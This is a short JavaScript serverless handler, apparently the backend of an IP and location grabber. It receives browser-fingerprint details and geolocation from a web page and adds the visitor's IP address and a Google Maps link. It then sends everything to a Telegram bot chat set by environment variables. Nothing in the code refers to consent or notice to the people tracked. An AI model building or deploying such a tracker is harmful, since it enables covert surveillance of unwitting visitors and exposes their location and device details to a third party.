export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ success: false });
  }

  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {
    return res.status(500).json({ success: false, error: "Missing BOT_TOKEN or CHAT_ID" });
  }

  const data = req.body;

  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || "Unknown";

  let message = `New Browser & Location Info:\n`;
  message += `Time: ${data.timestamp}\n`;
  message += `IP: ${ip}\n\n`;

  if (data.browser) {
    message += `User-Agent: ${data.browser.userAgent}\n`;
    message += `Platform: ${data.browser.platform}\n`;
    message += `Languages: ${data.browser.languages}\n`;
    message += `Screen: ${data.browser.screen}\n`;
    message += `Timezone: ${data.browser.timezone}\n`;
    message += `Hardware: ${data.browser.hardwareConcurrency} cores, ${data.browser.deviceMemory}GB RAM\n`;
    message += `Connection: ${data.browser.connection ? data.browser.connection.type : 'Unknown'}\n`;
  }

  if (data.geo) {
    message += `\nLocation: ${data.geo}\n`;
    if (data.mapLink) {
      message += `Google Maps: ${data.mapLink}\n`;
    }
  }

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown"
      })
    });

    res.status(200).json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false });
  }
}
